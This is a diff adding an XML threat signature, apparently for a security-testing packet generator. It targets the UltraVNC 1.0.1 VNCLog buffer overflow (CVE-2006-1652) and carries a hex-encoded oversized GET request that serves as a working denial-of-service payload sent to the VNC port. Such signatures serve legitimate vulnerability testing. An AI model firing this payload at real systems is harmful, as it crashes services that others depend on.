@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="UltraVNC VNCLog Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in the UltraVNC server. The vulnerability is caused by improper validation of user supplied requests sent to the affected component. A successful attack can result in the termination of the UltraVNC service."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="VNC"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Ultr@VNC"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Ultr@VNC_Ultr@VNC"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Ultr@VNC_Ultr@VNC_1.0.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20060404-13"/>
+    <CVEID display="true" value="CVE-2006-1652"/>
+    <bugtraqID display="true" value="17378"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="8a8df00a10e88c0f9082b83e46bcb9a8"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633372624621458750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1203389420" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="VNCdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$VNCdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F4471646871464E4868796678596B44526F505152706D51617034734257746F4155756A6F45785579327A6561366B6846715863617755436436613561454452375834666F546F336853366B694E6D6954635073643367786D7830736F4671716F4C79366D53416E356F3247626C31676663306B6C746D4B4E6A6F4F5741355975674C79666A726A43574873546B376D7777764B34686352484C574A53617649326939703050633535663170716576563758456B5759594579464134497457654A52696862734C5A4C535751756465777867716B726B34746D65567736524E476365786453316C646968716D32354A6B4E39624B7351636459487344744A526E66664D6B6641426F666D5648625144396D4A4658647A45495670775A64734E5757774B4D68436348753472744471797962503338376A666F436E65684A3538685850634D553363586539566368576843563855506250414A634A53336944307263613250325768785470656E337930784F525667396C707041315664705A52494F57383959733971786E627478756B4971584252745249384D6841694D3370516152365266593452754343574143613162626859734D7139446D553775376F613331686E414646336A7157414957644D357776697870533669556E3672573159494E4177366268525A7A5876717648763558454D716273533872523375734631374D57597554646C6273785A39306C633573317A4579666B51585148544875677A39774F524C69754A334E39464D4A4C65787A465538565765477133546B36596135534C366846626843624C445836586E78625249754155494A316E346B47643467385A6E78356730736B307258774A3438706D5647317736795466554452707A32646D4E32787843534D6E396374335141767439794D787074307177495655524E4E70376536327A4F69593062457656793566315555716C366B48704A57393362334170793735306E5A58716A4C65576F50484A516F5674764145484D7A4B636F3173516A6757646E4F464F724D484A444D35696148453930435039347135614738726C39326858424F5A6371576A306332396D627854526E67617645505A35516846497452646E38766B66466F47764B7863514B325147584E756462723335647245614D566C69566A6D304F7561674E46523847543131756266684F5475454A4F66723576526F526C4134453639783239464D4E536D3368334943307152613337556F7759627752723843397A56555453793768355131416A533453556D716F4D38765338716268424E6746507646443930574D527334486D4F6144514934364E76793661667344536E6D48697633366259693938424D6D55544E6E67646133717635624C564E5A5249427537326338396C4D6B37767349376A6E47527476200D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <Stateful display="false" value="true"/>
+  <DestIPVarName display="false" value="$destIP"/>
+</threatSignature>
